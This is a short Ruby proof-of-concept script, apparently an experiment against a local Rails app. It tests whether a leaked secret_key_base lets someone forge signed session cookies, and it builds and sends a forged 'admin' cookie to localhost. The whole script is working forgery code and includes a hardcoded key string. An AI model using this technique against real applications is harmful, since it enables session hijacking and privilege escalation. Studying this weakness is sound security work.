# If we have the secret base key, can we forge signed cookies and decrypt
# encypted cookies?

require 'net/http'
require 'cgi'
require 'base64'
require 'openssl'
require 'active_support/all'

LEAKED_BASE_SECRET = 'cdc8441f641f565e967a0786bd31c50be6e7ea790e17c26ab7083bcb00d9a301c86dcd89c9d8585471a6c28322238682b6f2b4dc79cd4aab8a2627961faed43a'.freeze
DEFAULT_SIGNED_COOKIE_SALT = 'signed cookie'.freeze
RAILS_HARDCODED_KEY_GENERATOR_ITERATIONS = 1000

# uri = URI('http://localhost:3000/set-cookies')
# response = Net::HTTP.get_response(uri)

# cookie_fields = response.get_fields('set-cookie')
# signed_cookie = cookie_fields.find do |cookie_field|
#   cookie_key = cookie_field.split('=')[0]
#   cookie_key == 'signed'
# end

# value_start_index = signed_cookie.index('=') + 1
# value_end_index = signed_cookie.index(';') - 1
# signed_cookie_value = signed_cookie[value_start_index..value_end_index]


key_generator = ActiveSupport::KeyGenerator.new(
  LEAKED_BASE_SECRET,
  iterations: RAILS_HARDCODED_KEY_GENERATOR_ITERATIONS
)
cookie_signing_secret = key_generator.generate_key(DEFAULT_SIGNED_COOKIE_SALT)

malicious_value = 'faked session data making me admin'
encoded_malicious_value = Base64.strict_encode64(
  ActiveSupport::JSON.encode(malicious_value)
)
signature = OpenSSL::HMAC.hexdigest(OpenSSL::Digest.const_get('SHA1').new,
                                    cookie_signing_secret,
                                    encoded_malicious_value)
malicious_cookie = "#{encoded_malicious_value}--#{signature}"

uri = URI('http://localhost:3000/show-cookies')
malicious_request = Net::HTTP::Get.new(uri)
malicious_request['Cookie'] = "plain=basic+check; signed=#{malicious_cookie}"

response = nil
Net::HTTP.start(uri.host, uri.port) do |http|
  response = http.request(malicious_request)
end

puts "Sending cookie: #{malicious_cookie}"
puts ''
p response.body
